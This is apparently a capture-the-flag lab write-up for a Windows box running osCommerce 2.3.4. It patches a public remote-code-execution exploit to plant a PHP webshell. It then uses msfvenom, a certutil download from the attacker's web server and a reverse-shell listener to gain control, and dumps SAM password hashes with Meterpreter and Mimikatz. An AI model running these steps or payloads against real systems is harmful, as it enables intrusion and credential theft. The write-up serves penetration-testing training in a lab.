Blueprint writeup(OSCP ✅ Metasploit)

### Nmap
`nmap -T4 -p- IP -vv`
```
Scanning 10.10.178.111 [65535 ports]
Discovered open port 445/tcp on 10.10.178.111
Discovered open port 80/tcp on 10.10.178.111
Discovered open port 3306/tcp on 10.10.178.111
Discovered open port 139/tcp on 10.10.178.111
Discovered open port 135/tcp on 10.10.178.111
Discovered open port 8080/tcp on 10.10.178.111
Discovered open port 443/tcp on 10.10.178.111

```

I normally try web services ports first. `80, 8080, 443`
The cms `osCommerce` is so obvious. All left to do is just to find the version for searching exploits.

### searchsploit
`searchsploit osCommerce 2.3.4`
```                                                                     |  Path
-------------------------------------------------------------------------------------- ---------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities                                           | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection                                         | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                                      | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                       | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                          | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                                            | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                                            | php/webapps/44374.py
-------------------------------------------------------------------------------------- ---------------------------------
```

Those 2 seems what we want
```
osCommerce 2.3.4.1 - Arbitrary File Upload               
osCommerce 2.3.4.1 - Remote Code Execution  
```
Both of them works as you may see it been used in some other writeups. But the first one requires installing a database that is too loud might alert the admin users. Let's go with the latter one.

`searchsploit -m 44374.py` to make a copy to the current path. then open it with your favourite editor. I did with `subl 44374.py` since I use sublime.

Can also reach it on exploit db. https://www.exploit-db.com/exploits/44374

line17 has a double slash typo `base_url = "http://localhost//oscommerce-2.3.4.1/catalog/"` it's no big deal but it better to fix it by simply remove it.

`base_url = "http://localhost/oscommerce-2.3.4.1/catalog/"`

### Real journey starts now
After setting up your baseurl and target url, you can just run the script `python3 44374.py`.
Found the system blocked the `system` keyword for php. 
A little googling shows some alternative.
https://stackoverflow.com/questions/7093860/php-shell-exec-vs-exec
https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80

`shell_exec` and `exec`

#### windows trick/tip/hole here
I tried to see if `shell_exec` or `exec` can be executed.
```
// on Kali
sudo tcpdump -i tun0 icmp
// on 44374.py
payload += 'shell_exec("ping -c 5 ip");'
```
Nothing happened. I can't get them back and it seems not been executed at all. I lost hours here as I was trying some random reverse shell plus other wrong things. **SOLVER**: `ping` for windows `-c` is a wrong parameter. `-n` is what we want.

### Python and PHP payload?
I didn't notice this first. You'll need to find a way out to see the output since your payload is in PHP comments. But the script is in Python.
I didn't try `var_dump(); die();`. It might work for you. These are the final code changes for the webshell.

```
payload = '\');'

# payload += 'exec("ping -n 5 10.x.x.x");'
# payload += '$var = shell_exec("ping -n 5 10.x.x.x");'
# payload += 'echo $var;'

payload += '$var = shell_exec($_GET["cmd"]);'
payload += 'echo $var;' # output make it a real webshell

payload += '/*'
```

### Root flag
```
http://10.10.173.99:8080/oscommerce-2.3.4/catalog/install/includes/configure.php?cmd=whoami
```
You already have root by running `whoami`. `type c:\....\desktop\root.txt.txt` 



### Both OSCP approved Metasploit Usage and non-Metasploit way
https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide

OSCP official doc: You may use the following against all of the target machines:

* multi handler (aka exploit/multi/handler)
* msfvenom
* pattern_create.rb
* pattern_offset.rb

To get a revershell only need the first two.

Generate the payload
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=12345 -f exe > shell.exe

and make it available for the target to reach
python3 -m http.server 80
```

### windows target get payload from attack(transfer files)
https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/


```
http://10.10.173.99:8080/oscommerce-2.3.4/catalog/install/includes/configure.php?cmd=certutil -urlcache -f http://ip/shell.exe shell.exe
```

after setup listeners run `shell.exe` to trigger it from the webshell

#### Not using Metasploit
`rlwrap nc -lvnp 12345` to get a better reverse shell. Then upload a `Mimikatz.exe` just like uploading the `shell.exe`.  Use it with commanding `lsadump::sam` to reveal all the hashes.

#### Metasploit exploit/multi/handler
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 12345
exploit
```
```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.x.x.x:12345 

[*] Sending stage (175174 bytes) to 10.10.173.99
[*] Meterpreter session 1 opened (10.x.x.x:12345 -> 10.10.173.99:49500) at 2021-05-16 12:02:18 +1200

meterpreter > hashdump
Administrator:500:xxxx:xxxx:::
Guest:501:xxxx:xxxxxxx:::

or using Mimikatz as well
meterpreter > load mimikatz
meterpreter > lsa_dump_sam
hashes shows here..
```
Just use `hashdump` or `load mimikatz` after the shell connected. The hash between `:hash:::`is what you want to crack for. Job well done.

